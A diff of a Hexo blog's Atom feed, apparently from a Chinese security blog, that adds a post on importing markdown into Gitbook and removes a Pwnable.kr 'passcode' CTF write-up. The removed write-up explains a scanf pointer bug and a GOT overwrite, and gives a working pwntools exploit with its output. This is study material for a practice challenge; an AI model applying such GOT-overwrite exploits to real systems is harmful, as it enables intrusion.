@@ -106,6 +106,45 @@
   </entry>
   
   <entry>
+    <title>Gitbook之markdown写作</title>
+    <link href="http://yoursite.com/2017/07/06/Gitbook%E4%B9%8Bmarkdown%E5%86%99%E4%BD%9C/"/>
+    <id>http://yoursite.com/2017/07/06/Gitbook之markdown写作/</id>
+    <published>2017-07-06T11:13:20.000Z</published>
+    <updated>2017-07-06T11:50:48.604Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近用gitbook来写一本关于ctf的小书，结果在用markdown写作的时候遇到了不少的问题。<br><a id="more"></a></p>
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>假如我现在要在书中加一篇文章《浅谈php反序列化漏洞》，而这篇文章我已经在Atom中写完并发布到blog上了，但如果直接把原md文件的文章内容复制到gitbook-editor中，就会发生不能识别或者乱识别的情况。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/4.jpg?raw=true" alt=""></p>
+<p>如上图，一级标题、代码等等都无法识别，需要手动把空格先删掉再打上。用这样的editor写作着实糟心…</p>
+<h1 id="曲线救国"><a href="#曲线救国" class="headerlink" title="曲线救国"></a>曲线救国</h1><p>所以为了不浪费时间，想了一个办法，分享如下。</p>
+<p>先新建好文章，这里以《浅谈php反序列化漏洞》为例。然后切换到FILE视图下，会有个对应的md文件。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/5.jpg?raw=true" alt=""></p>
+<p>接着将原本已经写好的markdown文件import到对应的文件目录下。这里就是在web文件夹右键，接着点击import File：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/6.jpg?raw=true" alt=""></p>
+<p>导入完成后，如果直接点开导入的md文件，看到的是未解析的内容。可以先点选其他文件，然后再点开导入的文件，直至内容被gitbook-editor成功解析，如下：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/7.jpg?raw=true" alt=""></p>
+<p>现在可以把被导入的文章的内容直接复制到我们要新增加的文章的编辑框里啦。复制完了后再把被导入的文章的md文件给删掉。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170706/8.jpg?raw=true" alt=""></p>
+<p>之后就是保存，同步，愉快的阅读啦。</p>
+<h1 id=""><a href="#" class="headerlink" title=":)"></a>:)</h1><p>该电子书的地址: <a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近用gitbook来写一本关于ctf的小书，结果在用markdown写作的时候遇到了不少的问题。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术杂谈" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
+    
+    
+      <category term="Gitbook" scheme="http://yoursite.com/tags/Gitbook/"/>
+    
+      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Tensorflow学习：常用API</title>
     <link href="http://yoursite.com/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/"/>
     <id>http://yoursite.com/2017/07/06/Tensorflow学习：常用API/</id>
@@ -1122,68 +1161,6 @@
     <summary type="html">
     
       &lt;p&gt;伪随机&lt;br&gt;
-    
-    </summary>
-    
-      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnable.kr:passcode</title>
-    <link href="http://yoursite.com/2017/04/08/Pwnable-kr-passcode/"/>
-    <id>http://yoursite.com/2017/04/08/Pwnable-kr-passcode/</id>
-    <published>2017-04-08T02:42:32.000Z</published>
-    <updated>2017-06-30T08:17:46.004Z</updated>
-    
-    <content type="html"><![CDATA[<p>简单GOT覆写<br><a id="more"></a></p>
-<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>先file看一下，32位。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/1.jpg?raw=true" alt=""></p>
-<p>用IDA打开，f5</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/2.jpg?raw=true" alt=""></p>
-<p>可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。</p>
-<h2 id="welcome（）"><a href="#welcome（）" class="headerlink" title="welcome（）"></a>welcome（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/3.jpg?raw=true" alt=""></p>
-<p>通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int v1; // [sp+18h] [bp-10h]@0</div></pre></td></tr></table></figure></p>
-<p>这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。</p>
-<h2 id="login（）"><a href="#login（）" class="headerlink" title="login（）"></a>login（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/4.jpg?raw=true" alt=""></p>
-<p>这里分别通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__isoc99_scanf(&quot;%d&quot;)</div></pre></td></tr></table></figure></p>
-<p>来获得 passcode1 和 passcode2  的值。要注意的是，这里  scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/7.jpg?raw=true" alt=""><br>以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">804857c:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]</div><div class="line">804857f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx</div></pre></td></tr></table></figure></p>
-<p>scanf的第一个参数即 格式化字符串 由下面这两句话传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048577:	b8 83 87 04 08        mov    eax,0x8048783</div><div class="line">省略</div><div class="line">8048583:	89 04 24              mov    DWORD PTR [esp],eax</div></pre></td></tr></table></figure></p>
-<p>0x8048783 处的数据如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/8.jpg?raw=true" alt=""><br>所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。</p>
-<p>对于passcode2 的分析同理。</p>
-<h1 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？</p>
-<p>从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/6.jpg?raw=true" alt=""></p>
-<p>70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。</p>
-<p>用peda的checksec检查发现开启了canary保护<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/5.jpg?raw=true" alt=""></p>
-<p>由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。</p>
-<h2 id="科普：GOT"><a href="#科普：GOT" class="headerlink" title="科普：GOT"></a>科普：GOT</h2><p>linux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。</p>
-<p>当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。</p>
-<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。</p>
-<p>printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下.<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/10.jpg?raw=true" alt=""></p>
-<p>对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/12.jpg?raw=true" alt=""></p>
-<p>这里对应着login（）中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return system(&quot;/bin/cat flag&quot;);</div></pre></td></tr></table></figure></p>
-<p>梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。<br>要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147）</p>
-<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">"passcode"</span>)</div><div class="line">r = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"12345"</span>)</div><div class="line"><span class="comment">#r = process("./passcode")</span></div><div class="line"></div><div class="line"></div><div class="line">printfGotAddr = elf.got[<span class="string">"printf"</span>]</div><div class="line">systemAddr = <span class="number">134514147</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"the printfGotAddr is "</span>+ hex(printfGotAddr)</div><div class="line"><span class="keyword">print</span> <span class="string">"the systemAddr is "</span>+ hex(systemAddr)</div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">96</span> + p32(printfGotAddr)</div><div class="line">payload2 = str(systemAddr)</div><div class="line">r.sendline(payload1)</div><div class="line">r.sendline(payload2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recv()</div></pre></td></tr></table></figure>
-<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="local-test"><a href="#local-test" class="headerlink" title="local test"></a>local test</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py</div><div class="line">[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[+] Opening connection to 127.0.0.1 on port 12345: Done</div><div class="line">the printfGotAddr is 0x804a000</div><div class="line">the systemAddr is 0x80485e3</div><div class="line">flag&#123;2222222222&#125;</div><div class="line">[*] Closed connection to 127.0.0.1 port 12345</div></pre></td></tr></table></figure>
-<h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">passcode@ubuntu:~$ ls</div><div class="line">flag  passcode	passcode.c</div><div class="line">passcode@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24)</div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)</div><div class="line">[*] &apos;/home/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">&gt;&gt;&gt; r = process(&quot;./passcode&quot;)</div><div class="line">[x] Starting local process &apos;./passcode&apos;</div><div class="line">[+] Starting local process &apos;./passcode&apos;: Done</div><div class="line">&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]</div><div class="line">&gt;&gt;&gt; systemAddr = 134514147</div><div class="line">&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)</div><div class="line">&gt;&gt;&gt; payload2 = str(systemAddr)</div><div class="line">&gt;&gt;&gt; r.sendline(payload1)</div><div class="line">&gt;&gt;&gt; r.sendline(payload2)</div><div class="line">&gt;&gt;&gt; print r.recv()</div><div class="line">[*] Process &apos;./passcode&apos; stopped with exit code 0</div><div class="line">Toddler&apos;s Secure Login System 1.0 beta.</div><div class="line">enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</div><div class="line">Sorry mom.. I got confused about scanf usage :(</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
-<p>FLAG: Sorry mom.. I got confused about scanf usage :(</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;简单GOT覆写&lt;br&gt;
     
     </summary>
     
